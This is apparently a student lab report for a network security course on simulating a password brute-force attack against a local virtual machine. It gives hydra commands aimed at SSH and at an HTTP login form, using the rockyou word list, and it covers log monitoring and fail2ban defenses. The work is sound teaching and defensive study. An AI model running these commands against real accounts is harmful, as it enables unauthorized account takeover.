# Performing a Credential-Based Brute Force Attack

## Course  
CYB/510 – Enterprise Network Security

## Objective  
This lab demonstrates how to simulate a credential-based brute force attack using a known password list against a service such as SSH or HTTP in a controlled lab environment. The goal is to understand how brute force attacks work and how to detect or mitigate them.

**Disclaimer:** This lab was performed against a local virtual machine with explicitly authorized access. No unauthorized systems or real-world accounts were targeted.

## Tools Used  
- Kali Linux or Parrot OS  
- `hydra` (fast password-cracking tool)  
- Target VM with SSH or HTTP login service  
- Wireshark or fail2ban (optional, for defense testing)

## Procedure  

- Ensure target system is reachable and has SSH enabled:
  ```bash
  ssh user@192.168.1.101
- Create or select a password list (e.g., /usr/share/wordlists/rockyou.txt)
- Run hydra to attempt login with username user:
    ```bash
    hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
- Alternatively, target an HTTP login form:
    ```bash
    hydra -L users.txt -P passwords.txt 192.168.1.101 http-post-form            "/login.php:username=^USER^&password=^PASS^:F=Invalid"
- Monitor login attempts on the target with:
    ```bash
    sudo journalctl -u ssh
- (Optional) Use Wireshark to capture SSH login attempts and observe traffic patterns
- (Optional) Install fail2ban on the target to test lockout rules

## Results
- Hydra executed a rapid sequence of login attempts using known or weak passwords
- A correct password resulted in successful login, demonstrating brute force effectiveness
- SSH logs showed repeated failures and eventual success
- Optional countermeasures (fail2ban, rate limiting) were tested and blocked repeated attempts

## Lessons Learned
- Brute force attacks rely on predictable or reused passwords
- Login rate-limiting, MFA, and account lockout policies are essential defenses
- SSH and web login interfaces are common brute-force targets and must be hardened
- Tools like hydra are effective in educational settings for simulating attacker techniques



